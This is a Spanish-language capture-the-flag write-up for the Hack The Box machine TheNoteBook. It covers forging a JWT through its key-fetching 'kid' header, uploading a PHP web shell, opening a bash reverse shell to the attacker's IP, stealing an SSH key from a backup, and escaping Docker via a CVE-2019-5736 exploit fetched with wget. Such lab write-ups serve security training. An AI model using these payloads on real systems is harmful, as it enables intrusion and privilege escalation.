---
layout: single
title: TheNoteBook - Hack The Box
excerpt: ""
date: 2023-11-30
classes: wide
header:
  teaser: /assets/images/htb-writeup-thenotebook/thenotebook_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - subdomain enumeration
  - abusing Upload File - Image to Text Flask Utility
  - SSTI
  - reading files through SSTI - SSH Private Key
  - Abusing Cron Job (Privilege Escalation)

---

# PortScan
____
```
# Nmap 7.93 scan initiated Thu Nov 30 16:24:46 2023 as: nmap -sCV -p22,80 -oN targeted 10.10.10.230
Nmap scan report for 10.10.10.230
Host is up (0.062s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86df10fd27a3fbd836a7ed909533f5bf (RSA)
|   256 e781d66cdfceb73003915cb513420644 (ECDSA)
|_  256 c60634c7fc00c46206c2360eee5ebf6b (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 30 16:24:55 2023 -- 1 IP address (1 host up) scanned in 9.26 seconds
```



# WebSite
____
![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130165809.png)

Tendríamos una página web para registrarnos e iniciar sesión, así que creo una cuenta, para ver qué hay una vez logueados... tendríamos un apartado para crear notas, pruebo un **XSS** pero no logro resultados, sigo indagando, pero no encontré ninguna vulnerabilidades, así que opté por hacer una enumeración de posibles directorios con **GoBuster** y el diccionario "**SecLists**" pero tampoco encontré nada.

Decidí fijarme en la **cookie de sesión**, viendo qué tenía la estructura de un **JWT**, fuí a la página [JWT.IO](https://jwt.io/) para ver su estructura.
![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130170322.png)

Vemos qué en los **Headers** contiene un campo curioso con nombre "**kid**" y posterior a ello está aparentemente está haciendo un request una **clave privada** desde su **localhost** al puerto **:7070**, por lo qué aparentemente éste campo se debe a qué en las cabeceras carga directamente la firma o **signature** para hacer una comparativa con la signature "real"...

También sinos fijamos en el **payload**, vemos qué está seteado el campo "**admin_cap**" como **falso**, así que a lo mejor si logro cargar una clave privada desde nuestra máquina puede ser que logré cambiar el mismo payload.

1. Procedo a la estructura **Json** del payload & la cabecera.
![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130171458.png)

2. Me creo una la clave privada usando "**openssl**".
```bash
openssl genrsa -out privKey.key 2400
```

3. Copiamos todo el contenido de la clave privada, para pegarlo en la **signature** del **JWT**.
```bash
cat privKey.key | xclip -sel clip
```

4. Pegamos el contenido de la clave en la **signature**.


Una vez hecho ésto, vemos qué se nos genará un nuevo **JWT**
![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130171835.png)

5. Nos montamos un servidor en Python en la ubicación de la clave privada qué creamos con "**openssl**" para qué aplique la comparativa y sean correctas ambas claves privadas.

```bash
python3 -m http.server 7070
```

6. Copiamos el nuevo **JWT** que nos generó **jwt.io** y lo usamos como un nuevo JWT para por último recargar la página.

Vemos en consola qué obtiene la clave privada desde el servidor python.
![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130173201.png)

Viendo así un pestaña qué es un panel administrativo:
![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130172504.png)

Podemos subir archivo, así que se me ocurre subir un **php** malicioso para controlar un **RCE** desde la URL por GET.
![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130173001.png)

```bash
touch cmd.php
```
que tendrá como contenido:
```php
<?php system($_GET['cmd']); ?>
```


He logrado subirlo éxitosamente.
![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130173532.png)

así que opto por verlo, & aparentemente está interpretando el PHP, lo corrobo con un "**whoami**".
![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130173602.png)


Viendo que funcionó, me entablaré una **Reverse Shell**, sino hay reglas "**iptables**" de por medio lo lograré.

1. Nos ponemos en escucha.
```bash
nc -nlvp PORT
```

2. Nos enviamos la Reverse desde la URL.
```bash
bash -c 'bash -i >%26/dev/tcp/10.10.14.x/PORT 0>%261'
```

![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130174447.png)

Obtendríamos la **Reverse Shell,** tan sólo quedaría darle tratamiento a la TYY, para andar comodamente en la shell, sino sabemos como [((LEE ESTE POST))](https://4uli.github.io/tratamiento-tty/)


# Escalada de Privilegios 1.
___

Indagando en la máquina para escalar privilegios, descubrimos un **backup** con nombre "**home**" por lo que se me ocurre puede ser el directorio personal de algun usuario del sistema.
```bash
ls -la /var/backups/home.tar.gz
```

Listando los permisos, vemos qué podemos leerlo, así que se me ocurre descomprimirlo.
```bash
tar -xzf /var/backups/home.tar.gz
```

![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130175945.png)

Pero no podemos descomprimirlo en éste directorio ya que aquí no tenemos permisos de escritura, así que lo moveré al directorio "**/tmp**".
```bash
cd /tmp/
cp /var/backups/home.tar.gz .
```

y ahora si podríamos descomprimirlo.
```bash
tar -xzf /var/backups/home.tar.gz
```

y encontraríamos el directorio personal del usuario "**noah**", junto con su clave privada **SSH** así que podemos aprovecharnos de ésta para conectarnos como **noah**.


1. Nos copiamos todo el contenido de la "**id_rsa**".

2. En nuestra máquina, nos pegamos la clave y damos permisos correctos al archivo.
```bash
nano id_rsa
chmod 600 id_rsa
```

3. nos conectamos con ésta clave por SSH como **noah**.
```bash
ssh -i id_rsa noah@10.10.10.230
```

y ya estaríamos como "noah"
![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130180647.png)


# Escalada de Privilegios 2
___

Listando los permisos **SUDOERS**.
```bash
sudo -l
```

![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130181933.png)

Vemos qué podemos ejecutar como quién sea la instrucción de ejecutar el contenedor "**webaap-dev01**", por lo que se me ocurre ejecutarlo con "**sudo**" de forma qué entre al contenedor como **Root** y luego tratar de hacer un "**docker breakout**".
![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130182114.png)
Pero sólo estamos en un contenedor, no estamos en la máquina real, así que intento hacer el **breakout**, o buscar posibles credenciales para root sin lograr encontrada nada...

así que opto por ver la versión del **Docker** a ver sí encontramos alguna vulnerabilidad.
![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130182233.png)

Vemos qué tiene una versión **18.06.0**, así que hago una búsqueda rápida en busca de vulnerabilidades para un "**breakout**" de esta versión.

Encontrando el siguiente **PoC** [CVE-2019-5736](https://github.com/Frichetten/CVE-2019-5736-PoC), qué leyendo sirve para escapar de un contenedor, así qué modificamos el código para darle permisos **SUID** a la Bash, y como el contenedor lo está ejecutando Root tendremos permisos para dicha acción.


Modificamos el script de la siguiente manera:
![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130183057.png)

Compilamos el script:
```bash
go build -ldflags "-s -w" exploit.go
```

Le reducimos el peso:
```bash
upx exploit.go
```

Nos montamos un servidor python en la ubicación del "**exploit**".
```bash
python3 -m http.server 80
```

Entramos al contenedor nuevamente como **Root** para obtener el exploit, y llamado la bash con su ruta absoluta.
```bash
wget 10.10.x.x/exploit
```

Le damos permisos de ejecución y lo ejecutamos:
```bash
chmod +x exploit
./exploit
```

Una vez se ejecute, nos metemos desde otra ventana en el contenedor ejecutando un "**/bin/sh**"
```bash
sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
```

![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130184824.png)

Logrando darle permisos **SUID** a la bash de la máquina real, logrando así el **Docker breakout**.
![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130184920.png)

